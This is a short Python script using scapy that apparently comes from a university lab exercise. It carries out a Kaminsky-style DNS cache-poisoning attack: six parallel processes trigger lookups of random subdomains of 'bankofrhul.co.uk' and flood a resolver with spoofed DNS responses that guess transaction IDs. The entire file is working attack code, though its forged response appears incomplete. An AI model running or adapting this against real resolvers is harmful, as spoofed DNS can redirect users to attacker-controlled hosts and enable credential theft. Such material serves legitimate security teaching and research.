###
# PRE-RUNNING STEPS: Run the following in your shell before running this code
# wget http://ftp.de.debian.org/debian/pool/main/s/scapy/python-scapy_2.2.0-1_all.deb
# dpkg -i python-scapy_2.2.0-1_all.deb
###
from scapy.all import *
from scapy.layers.dns import DNS
from scapy.layers.inet import IP, UDP
from random import choice
from string import ascii_letters
from multiprocessing import Process

# Create each layer of the packet
def up_all_night_to_get_lucky():
    iplayer = IP(src = "10.0.0.1", dst = "10.10.0.1")
    udplayer = UDP(dport = 40043, chksum = None) # Please autogenerate the checksum
    dnslayer = DNS(qr = 1, id = random.randint(0, 63999)) # This is a response

    # Combine layers
    totalpacket = iplayer / udplayer / dnslayer

    # Execute Order 66
    random_sub_domain = ''.join(choice(ascii_letters) for i in range(20)) # Generate random subdomain

    while True:
        os.system("dig "+random_sub_domain+".bankofrhul.co.uk&")
        send(totalpacket, count=50)
        random_sub_domain = ''.join(choice(ascii_letters) for i in range(20)) # Gen Next random subdomain
        dnslayer.id = random.randint(0, 65535) # Gen Next query id guess

# Run the guess function in multiple processes
p0 = Process(target=up_all_night_to_get_lucky)
p1 = Process(target=up_all_night_to_get_lucky)
p2 = Process(target=up_all_night_to_get_lucky)
p3 = Process(target=up_all_night_to_get_lucky)
p4 = Process(target=up_all_night_to_get_lucky)
p5 = Process(target=up_all_night_to_get_lucky)

p0.start()
p1.start()
p2.start()
p3.start()
p4.start()
p5.start()
